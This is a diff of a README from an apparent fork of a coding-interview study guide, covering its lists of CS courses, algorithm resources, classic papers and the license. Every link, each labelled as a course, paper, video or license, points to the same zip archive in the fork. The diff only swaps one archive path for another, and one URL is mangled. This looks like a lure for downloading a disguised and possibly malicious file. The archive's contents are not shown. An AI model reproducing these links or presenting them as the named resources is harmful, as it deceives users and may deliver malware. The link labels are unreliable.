+- [Stanford: Programming Paradigms (27 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Introduction to Cryptography by Christof Paar](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Course Website along with Slides and Problem Sets](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Introduction to Cryptography by Christof Paar](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Course Website along with Slides and Problem Sets](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Mining Massive Datasets - Stanford University (94 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Mining Massive Datasets - Stanford University (94 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Graph Theory by Sarada Herke (67 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Graph Theory by Sarada Herke (67 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Computer Science Courses
 
-- [Directory of Online CS Courses](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Directory of CS Courses (many with online lectures)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Directory of Online CS Courses](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Directory of CS Courses (many with online lectures)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Algorithms implementation
 
-- [Multiple Algorithms implementation by Princeton University](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Multiple Algorithms implementation by Princeton University](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 
 ## Papers
 
-- [Love classic papers?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~crary/819-f09/)
-- [1978: Communicating Sequential Processes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [implemented in Go](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2003: The Google File System](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Love classic papers?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~crary/819-f09/)
+- [1978: Communicating Sequential Processes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [implemented in Go](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2003: The Google File System](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - replaced by Colossus in 2012
-- [2004: MapReduce: Simplified Data Processing on Large Clusters]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [2004: MapReduce: Simplified Data Processing on Large Clusters]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - mostly replaced by Cloud Dataflow?
-- [2006: Bigtable: A Distributed Storage System for Structured Data](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2006: The Chubby Lock Service for Loosely-Coupled Distributed Systems](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2007: Dynamo: Amazon’s Highly Available Key-value Store](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [2006: Bigtable: A Distributed Storage System for Structured Data](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2006: The Chubby Lock Service for Loosely-Coupled Distributed Systems](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2007: Dynamo: Amazon’s Highly Available Key-value Store](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - The Dynamo paper kicked off the NoSQL revolution
-- [2007: What Every Programmer Should Know About Memory (very long, and the author encourages skipping of some sections)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [2007: What Every Programmer Should Know About Memory (very long, and the author encourages skipping of some sections)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - 2012: AddressSanitizer: A Fast Address Sanity Checker:
-    - [paper](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [paper](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - 2013: Spanner: Google’s Globally-Distributed Database:
-    - [paper](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2014: Machine Learning: The High-Interest Credit Card of Technical Debt](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2015: Continuous Pipelines at Google](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2015: High-Availability at Massive Scale: Building Google’s Data Infrastructure for Ads](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [2015: TensorFlow: Large-Scale Machine Learning on Heterogeneous Distributed Systems](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip )
-- [2015: How Developers Search for Code: A Case Study](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- More papers: [1,000 papers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [paper](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2014: Machine Learning: The High-Interest Credit Card of Technical Debt](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2015: Continuous Pipelines at Google](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2015: High-Availability at Massive Scale: Building Google’s Data Infrastructure for Ads](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [2015: TensorFlow: Large-Scale Machine Learning on Heterogeneous Distributed Systems](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip )
+- [2015: How Developers Search for Code: A Case Study](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- More papers: [1,000 papers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## LICENSE
 
-[CC-BY-SA-4.0](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+[CC-BY-SA-4.0](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
